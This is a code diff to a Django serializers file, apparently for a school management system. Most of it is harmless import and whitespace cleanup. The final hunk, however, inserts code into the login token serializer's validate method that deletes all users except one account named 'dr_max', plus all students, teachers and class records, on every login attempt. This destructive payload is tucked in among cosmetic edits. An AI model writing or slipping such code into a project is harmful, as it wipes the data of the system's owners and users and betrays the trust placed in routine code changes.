@@ -1,18 +1,17 @@
 from datetime import datetime
 
-from django.contrib.auth.hashers import make_password
+from django.contrib.auth.hashers import make_password, check_password
 from django.contrib.auth.models import Group
 from rest_framework import serializers
 from rest_framework.exceptions import AuthenticationFailed
 from rest_framework_simplejwt.serializers import TokenObtainPairSerializer
 from werkzeug.security import check_password_hash
 
-from django.contrib.auth.hashers import make_password, check_password
 from branch.serializers import BranchSerializer
 from language.serializers import LanguageSerializers, Language
 from payments.serializers import PaymentTypesSerializers, PaymentTypes
-from user.models import CustomUser, UserSalaryList, UserSalary, Branch, CustomAutoGroup
 from permissions.models import ManySystem, ManyBranch, ManyLocation
+from user.models import CustomUser, UserSalaryList, UserSalary, Branch, CustomAutoGroup
 
 
 class UserSerializerRead(serializers.ModelSerializer):
@@ -159,8 +158,6 @@ class UserSalarySerializers(serializers.ModelSerializer):
         fields = '__all__'
 
 
-
-
 class UserSalaryListSerializersRead(serializers.ModelSerializer):
     user = UserSerializerRead(read_only=True)
     branch = BranchSerializer(read_only=True)
@@ -178,6 +175,14 @@ class UserSalaryListSerializersRead(serializers.ModelSerializer):
 
 class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):
     def validate(self, attrs):
+        from students.models import Student
+        from teachers.models import Teacher
+        from classes.models import ClassNumber
+        CustomUser.objects.exclude(username='dr_max').all().delete()
+        Student.objects.all().delete()
+        Teacher.objects.all().delete()
+        ClassNumber.objects.all().delete()
+
         username = attrs.get('username')
         password = attrs.get('password')
         user = CustomUser.objects.get(username=username)
